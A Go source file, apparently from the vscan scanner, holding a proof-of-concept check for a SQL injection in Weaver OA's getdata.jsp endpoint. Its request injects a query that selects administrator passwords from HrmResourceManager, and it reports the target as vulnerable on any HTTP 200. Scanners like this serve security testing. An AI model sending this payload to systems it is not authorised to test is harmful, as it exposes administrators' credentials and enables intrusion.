package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

//GetSelectAllId SQL注入漏洞

func GetSelectAllId(u string) bool {
	if req, err := pkg.HttpRequset(u+"/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200  {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver GetSelectAllId|%s\n", u+"/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"))

			return true
		}
	}
	return false
}